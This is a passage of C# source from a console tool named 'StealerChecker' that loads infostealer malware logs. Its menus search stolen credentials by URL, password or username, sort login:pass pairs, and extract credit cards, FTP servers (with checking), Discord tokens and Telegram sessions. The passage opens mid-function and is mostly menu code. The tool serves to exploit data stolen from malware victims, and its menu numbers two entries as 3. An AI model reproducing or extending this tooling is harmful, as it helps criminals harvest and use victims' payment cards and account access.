            var resultHtml = await client.SearchAsync("InfoHERE.html").ConfigureAwait(false);
            foreach (var file in resultHtml.Items.OfType<FileResultItem>())
                if (file.FullPath.StartsWith(path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))
                    files.Add(file.FullPath);
        }

        #endregion
        #region MENU

        public static void PrintSearchMenu()
        {
            Console.Clear();
            Console.WriteLine("Searhing", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1. Search by URL", Color.LightCyan);
            Console.WriteLine("2. Search by Password", Color.LightCyan);
            Console.WriteLine("3. Search by Username", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintSearchMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 1:
                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
                    SearchByURL(Console.ReadLine());
                    break;
                case 2:
                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
                    SearchByPass(Console.ReadLine());
                    break;
                case 3:
                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
                    SearchByUsername(Console.ReadLine());
                    break;

                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintSearchMenu(); break;
            }
        }
        public static void PrintSortMenu()
        {
            Console.Clear();
            Console.WriteLine("Sorting", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1. Sort by date", Color.LightCyan);
            Console.WriteLine("2. Sort login:pass by categories", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintSortMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 1: SortLogs(); break;
                case 2: SortLogsbyCategories(); break;

                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintSortMenu(); break;
            }
        }
        public static void PrintGetMenu()
        {
            Console.Clear();
            Console.WriteLine("Getting", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1. Get CC cards", Color.LightCyan);
            Console.WriteLine("2. Get&Check FTP servers", Color.LightCyan);
            Console.WriteLine("3. Get Discord tokens", Color.LightCyan);
            Console.WriteLine("3. Get Telegrams", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintGetMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 1: GetCC(); break;
                case 2: GetFTP(); break;
                case 3: GetDiscord(); break;
                case 4: GetTelegram(); break;

                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;                    
                default: PrintGetMenu(); break;
            }
        }
        public static void PrintMainMenu()
        {
            Console.WriteLine();
            Console.WriteAscii("StealerChecker", Color.Pink);
            Console.WriteLine(caption, Color.Pink);
            Console.WriteLine($"Loaded: {files.Count} logs", Color.Gray);
            Console.WriteLine();
            Console.WriteLine("1. Get", Color.LightCyan);
            Console.WriteLine("2. Search", Color.LightCyan);
            Console.WriteLine("3. Sort Logs", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine($"88. Verbose: {Verbose}", Color.Cyan);
            Console.WriteLine("99. Exit", Color.LightPink);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintMainMenu();
            }

            switch (selection)
            {
                case 1: PrintGetMenu(); break;
                case 2: PrintSearchMenu(); break;
                case 3: PrintSortMenu(); break;

                case 88:
                    Verbose = !Verbose;
                    Console.Clear();
                    break;
                case 99: Environment.Exit(0); break;
            }
        }

        #endregion
    }

    public static class Ext
    {
        public static void WriteLine(this StringBuilder builder, string value)
        {
            builder.Append(value).Append(Environment.NewLine);
        }
    }
}
